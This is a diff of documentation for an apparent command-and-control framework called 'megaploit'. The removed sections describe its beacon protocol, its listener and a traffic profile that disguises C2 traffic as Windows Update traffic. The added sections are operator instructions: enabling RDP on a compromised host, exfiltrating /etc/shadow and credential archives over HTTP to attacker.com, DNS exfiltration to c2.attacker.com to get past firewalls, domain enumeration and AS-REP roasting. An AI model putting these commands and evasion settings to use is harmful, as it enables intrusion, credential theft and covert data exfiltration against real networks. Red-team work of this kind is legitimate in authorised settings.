-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>[2–9]:   Extended length (if length == 126 → 2 bytes; if 127 → 8 bytes)
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>[mask]:  4-byte masking key (client → server only)
-</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>[data]:  Payload (XOR-masked on client frames)
-</span></code></pre></div>
-<p>After the WebSocket handshake, the existing C2 framing (layers 4–7) runs <strong>inside</strong> WebSocket binary frames unchanged. <code>WsTransport.send(data)</code> and <code>.recv()</code> are drop-in replacements for <code>conn.sendall</code> and <code>conn.recv</code> at the socket level.</p>
-<p><strong>Opcode handling:</strong>
-- <code>0x02</code> (binary) → normal data frame
-- <code>0x09</code> (ping) → automatically answered with a pong
-- <code>0x08</code> (close) → raises <code>ConnectionError</code>, closes the socket</p>
-<hr />
-<h2 id="13-malleable-c2-profile">13. Malleable C2 profile<a class="headerlink" href="#13-malleable-c2-profile" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/profile.py"><code>megaploit/core/profile.py</code></a></p>
-<p>A C2 profile does <strong>not</strong> change the wire protocol. It adds metadata and timing behaviour that shapes how the traffic looks to a network observer:</p>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Effect</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>sleep</code> + <code>jitter_max</code></td>
-<td>Agent beacon interval = <code>sleep + random(0, jitter_max)</code> seconds</td>
-</tr>
-<tr>
-<td><code>uri_paths</code></td>
-<td>Agents rotate through these paths on HTTP-mode transports</td>
-</tr>
-<tr>
-<td><code>request_headers</code></td>
-<td>HTTP headers injected into agent requests (mimic browsers, CDNs, etc.)</td>
-</tr>
-<tr>
-<td><code>response_headers</code></td>
-<td>HTTP headers returned by the C2 server</td>
-</tr>
-<tr>
-<td><code>user_agent</code></td>
-<td>Overrides the <code>User-Agent</code> header</td>
-</tr>
-<tr>
-<td><code>metadata_prepend/append/location</code></td>
-<td>How agent identity tokens are embedded in traffic</td>
-</tr>
-</tbody>
-</table>
-<p><strong>Profile file (YAML):</strong>
-<div class="language-yaml highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;WindowsUpdate&quot;</span>
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="nt">sleep</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">60</span>
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="nt">jitter_max</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">15</span>
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="nt">uri_paths</span><span class="p">:</span>
-</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;/windowsupdate/v9/selfupdate/AU/x86/XP/en/au.cab&quot;</span>
-</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="nt">request_headers</span><span class="p">:</span>
-</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="w">  </span><span class="nt">Host</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;update.microsoft.com&quot;</span>
-</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="w">  </span><span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Windows-Update-Agent/10.0.10011.16384&quot;</span>
-</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="nt">response_headers</span><span class="p">:</span>
-</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="w">  </span><span class="nt">Server</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Microsoft-IIS/10.0&quot;</span>
-</span></code></pre></div></p>
-<p>Load with:
-<div class="language-python highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">megaploit.core.profile</span><span class="w"> </span><span class="kn">import</span> <span class="n">load_profile</span>
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="n">profile</span> <span class="o">=</span> <span class="n">load_profile</span><span class="p">(</span><span class="s2">&quot;profiles/windows_update.yaml&quot;</span><span class="p">)</span>
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">profile</span><span class="o">.</span><span class="n">sleep_with_jitter</span><span class="p">())</span>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="n">headers</span> <span class="o">=</span> <span class="n">profile</span><span class="o">.</span><span class="n">build_http_headers</span><span class="p">()</span>
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="n">path</span>    <span class="o">=</span> <span class="n">profile</span><span class="o">.</span><span class="n">next_uri</span><span class="p">()</span>
-</span></code></pre></div></p>
-<hr />
-<h2 id="14-listener-hardening-pipeline">14. Listener hardening pipeline<a class="headerlink" href="#14-listener-hardening-pipeline" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/server/listener.py"><code>megaploit/server/listener.py</code></a></p>
-<p>Every inbound TCP connection passes through six gates in order. Failure at any gate closes the socket immediately with no response data:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>TCP accept
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>    │
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>    ▼
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>[1] IP allowlist
-</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>    Configured with --allow-ip; if set, any IP not in the list is dropped
-</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>    before any data is read.
-</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>    │
-</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>    ▼
-</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>[2] Rate limiter
-</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>    Sliding 60-second window per source IP.
-</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>    MAX_AUTH_ATTEMPTS_PER_MIN = 5  (default)
-</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>    Exceeding the limit → IP banned for IP_BAN_DURATION = 300 s.
-</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>    All events written to loot/audit.log.
-</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a>    │
-</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a>    ▼
-</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a>[3] TLS upgrade (optional)
-</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>    ssl.wrap_socket() with the hardened server context.
-</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a>    SSLError → drop.
-</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a>    │
-</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a>    ▼
-</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a>[4] HMAC-SHA256 authentication
-</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>    AUTH_TIMEOUT = 10 s socket deadline.
-</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a>    Any mismatch or timeout → drop + audit log entry.
-</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a>    │
-</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a>    ▼
-</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a>[5] Protocol version handshake
-</span><span id="__span-29-27"><a id="__codelineno-29-27" name="__codelineno-29-27" href="#__codelineno-29-27"></a>    Negotiate v1 / v2 (AES-GCM).
-</span><span id="__span-29-28"><a id="__codelineno-29-28" name="__codelineno-29-28" href="#__codelineno-29-28"></a>    │
-</span><span id="__span-29-29"><a id="__codelineno-29-29" name="__codelineno-29-29" href="#__codelineno-29-29"></a>    ▼
-</span><span id="__span-29-30"><a id="__codelineno-29-30" name="__codelineno-29-30" href="#__codelineno-29-30"></a>[6] Session created
-</span><span id="__span-29-31"><a id="__codelineno-29-31" name="__codelineno-29-31" href="#__codelineno-29-31"></a>    Session object handed to on_session() callback.
-</span><span id="__span-29-32"><a id="__codelineno-29-32" name="__codelineno-29-32" href="#__codelineno-29-32"></a>    Audit log entry: ACCEPTED ip=… session=… cipher=…
-</span></code></pre></div>
-<p><strong>Audit log format</strong> (<code>loot/audit.log</code>):
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>2024-03-15 14:22:01 UTC  LISTEN  bind=0.0.0.0:4444  tls=yes  allowlist=none
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>2024-03-15 14:22:45 UTC  ACCEPTED ip=10.0.0.5         port=51234  session=1  cipher=ECDHE-RSA-AES256-GCM-SHA384
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>2024-03-15 14:23:10 UTC  REJECTED ip=10.0.0.99        port=43210  reason=auth_failed
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>2024-03-15 14:25:00 UTC  BANNED   ip=10.0.0.99        attempts=6  ban_until=14:30:00
-</span></code></pre></div></p>
-<hr />
-<h2 id="15-connection-state-lifecycle">15. Connection state lifecycle<a class="headerlink" href="#15-connection-state-lifecycle" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:64</code></a> — <code>_ConnState</code>, <code>get_state()</code>, <code>set_state()</code>, <code>remove_state()</code></p>
-<p>Each socket has a <code>_ConnState</code> object stored in a module-level dict keyed by the socket file descriptor:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">_states</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="n">_ConnState</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>   <span class="c1"># fd → _ConnState</span>
-</span></code></pre></div>
-<p>State is created lazily on the first <code>get_state(conn)</code> call (defaults to plaintext, seq=0). The version handshake replaces it with a configured state via <code>set_state()</code>.</p>
-<p>When a session ends (<code>listener.cleanup_session(conn)</code>), <code>remove_state(conn)</code> deletes the entry to avoid fd reuse collisions.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>socket accepted
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>      │
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>      ▼
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>get_state() → creates _ConnState(encrypted=False, key=None)
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>      │
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>      ▼
-</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>handshake_server() → set_state(_ConnState(encrypted=True, key=…))
-</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>      │
-</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a> [session active — all send/recv use this state]
-</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>      │
-</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>      ▼
-</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>session.close() → remove_state(conn) → entry deleted
+<h2 id="remote-desktop">Remote Desktop<a class="headerlink" href="#remote-desktop" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a># Enable RDP (Windows)
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>megaploit session(1) » rdp_enable
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>[+] RDP enabled — open port 3389
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a># Connect from your machine:
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>mstsc /v:target-ip:3389
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a># Or forward through another port if 3389 is blocked:
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>megaploit session(1) » portfwd 9000 target-ip 3389
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>mstsc /v:operator-ip:9000
 </span></code></pre></div>
 <hr />
-<h2 id="16-agent-reconnect-behaviour">16. Agent reconnect behaviour<a class="headerlink" href="#16-agent-reconnect-behaviour" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/config.py"><code>megaploit/core/config.py</code></a>, <a href="../megaploit/agent/go_agent/main.go"><code>megaploit/agent/go_agent/main.go:73</code></a></p>
-<p>Agents reconnect automatically after any disconnection. The reconnect delay uses jitter to prevent multiple agents from hammering the server simultaneously after a restart:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>delay = RECONNECT_DELAY + random(0, RECONNECT_JITTER)
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>      = 10 s + random(0, 5 s)
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>      = 10–15 s
+<h2 id="data-exfiltration">Data Exfiltration<a class="headerlink" href="#data-exfiltration" title="Permanent link">&para;</a></h2>
+<h3 id="http-exfiltration">HTTP Exfiltration<a class="headerlink" href="#http-exfiltration" title="Permanent link">&para;</a></h3>
+<p>Exfiltrate a file to a web server you control:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>megaploit session(1) » exfil_http http://attacker.com/upload /etc/shadow
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>megaploit session(1) » exfil_http http://192.168.1.10:8000/upload credentials.zip
 </span></code></pre></div>
-<p>The Go agent uses a cryptographically random jitter (<code>crypto/rand</code>) of 0–5000 ms on top of the 10 s base, then repeats <code>run()</code> in a loop:</p>
-<div class="language-go highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="k">for</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="w">    </span><span class="nx">run</span><span class="p">()</span><span class="w">   </span><span class="c1">// connect, auth, handshake, command loop</span>
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="w">    </span><span class="nx">jitter</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">rand</span><span class="p">.</span><span class="nx">Int</span><span class="p">(</span><span class="nx">rand</span><span class="p">.</span><span class="nx">Reader</span><span class="p">,</span><span class="w"> </span><span class="nx">big</span><span class="p">.</span><span class="nx">NewInt</span><span class="p">(</span><span class="mi">5000</span><span class="p">))</span>
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="w">    </span><span class="nx">time</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">(</span><span class="mi">10</span><span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">(</span><span class="nx">jitter</span><span class="p">.</span><span class="nx">Int64</span><span class="p">())</span><span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span><span class="p">)</span>
-</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="p">}</span>
+<p>Set up a simple receiver:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1"># Python receiver:</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c1"># Or with upload support:</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="s2">from http.server import BaseHTTPRequestHandler, HTTPServer</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="s2">class H(BaseHTTPRequestHandler):</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="s2">    def do_POST(self):</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="s2">        data = self.rfile.read(int(self.headers[&#39;Content-Length&#39;]))</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="s2">        open(&#39;received_file&#39;, &#39;wb&#39;).write(data)</span>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="s2">        self.send_response(200); self.end_headers()</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="s2">HTTPServer((&#39;&#39;, 8000), H).serve_forever()</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="s2">&quot;</span>
+</span></code></pre></div>
+<h3 id="dns-exfiltration-bypasses-http-firewalls">DNS Exfiltration (bypasses HTTP firewalls)<a class="headerlink" href="#dns-exfiltration-bypasses-http-firewalls" title="Permanent link">&para;</a></h3>
+<p>Encode data into DNS queries — works even when outbound HTTP is blocked:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>megaploit session(1) » exfil_dns &quot;sensitive_data&quot; c2.attacker.com
+</span></code></pre></div>
+<p>Data is encoded into DNS A-record lookups: <code>&lt;encoded-data&gt;.c2.attacker.com</code>
+Your DNS server (or <code>dig</code> monitoring) captures the queries.</p>
+<hr />
+<h2 id="domain-operations">Domain Operations<a class="headerlink" href="#domain-operations" title="Permanent link">&para;</a></h2>
+<h3 id="view-domain-topology">View domain topology<a class="headerlink" href="#view-domain-topology" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>megaploit session(1) » net_view CORPORATE.LOCAL
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>[+] Domain: CORPORATE.LOCAL
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>[+] Domain Controllers: DC01 (10.10.0.5), DC02 (10.10.0.6)
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>[+] Computers (24): WORKSTATION01, WS02, ..., FILESERVER01, SQL01
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>[+] Shares on FILESERVER01: Finance, IT, HR, ADMIN$
+</span></code></pre></div>
+<h3 id="dns-based-host-discovery">DNS-based host discovery<a class="headerlink" href="#dns-based-host-discovery" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>megaploit session(1) » dns_query _ldap._tcp.CORPORATE.LOCAL
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>megaploit session(1) » dns_query _kerberos._tcp.CORPORATE.LOCAL
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>megaploit session(1) » dns_query DC01.CORPORATE.LOCAL
+</span></code></pre></div>
+<h3 id="kerberos-enumeration-from-scanner-modules">Kerberos enumeration (from scanner modules)<a class="headerlink" href="#kerberos-enumeration-from-scanner-modules" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>megaploit [0] » use auxiliary/scanner/kerberos_asrep_roast
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>megaploit [0] » setopt RHOSTS 10.10.0.5
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>megaploit [0] » setopt DOMAIN CORPORATE.LOCAL
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>megaploit [0] » run
 </span></code></pre></div>
 <hr />
-<h2 id="17-complete-byte-level-trace">17. Complete byte-level trace<a class="headerlink" href="#17-complete-byte-level-trace" title="Permanent link">&para;</a></h2>
-<p>This trace shows every byte exchanged for a single <code>ls</code> command over an encrypted (v2) connection. Hex values are shown where relevant.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>── PHASE 1: TCP connect ────────────────────────────────────────────────────
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>  Agent → Server: [SYN]
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>  Server → Agent: [SYN-ACK]
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>  Agent → Server: [ACK]
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
-</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a>── PHASE 2: (optional) TLS handshake ───────────────────────────────────────
-</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>
-</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>  [standard TLS 1.2/1.3 handshake — ~7 round trips, omitted for brevity]
-</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>
-</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>── PHASE 3: HMAC-SHA256 authentication ─────────────────────────────────────
-</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>
-</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>  Server → Agent:  16 bytes  e.g.  a3 f7 02 ... (random challenge)
-</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>  Agent  → Server: 32 bytes  HMAC-SHA256(key, challenge)
-</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a>
-</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a>── PHASE 4: Protocol version handshake ─────────────────────────────────────
-</span><span id="__span-35-17"><a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a>
-</span><span id="__span-35-18"><a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a>  Server → Agent:  1 byte   4D  (&#39;M&#39; = v2)
-</span><span id="__span-35-19"><a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a>  Agent  → Server: 1 byte   4D  (echo)
-</span><span id="__span-35-20"><a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a>  [Both sides activate AES-GCM state]
-</span><span id="__span-35-21"><a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a>
-</span><span id="__span-35-22"><a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a>── PHASE 5: Operator sends &quot;ls&quot; command ────────────────────────────────────
-</span><span id="__span-35-23"><a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a>
-</span><span id="__span-35-24"><a id="__codelineno-35-24" name="__codelineno-35-24" href="#__codelineno-35-24"></a>  Plaintext to encrypt:
-</span><span id="__span-35-25"><a id="__codelineno-35-25" name="__codelineno-35-25" href="#__codelineno-35-25"></a>    seq (8 bytes, BE):  00 00 00 00 00 00 00 01
-</span><span id="__span-35-26"><a id="__codelineno-35-26" name="__codelineno-35-26" href="#__codelineno-35-26"></a>    JSON payload:       22 6C 73 22             → &quot;ls&quot;
-</span><span id="__span-35-27"><a id="__codelineno-35-27" name="__codelineno-35-27" href="#__codelineno-35-27"></a>
-</span><span id="__span-35-28"><a id="__codelineno-35-28" name="__codelineno-35-28" href="#__codelineno-35-28"></a>  AES-256-GCM encrypt(plaintext):
-</span><span id="__span-35-29"><a id="__codelineno-35-29" name="__codelineno-35-29" href="#__codelineno-35-29"></a>    nonce (12 bytes):   [random]
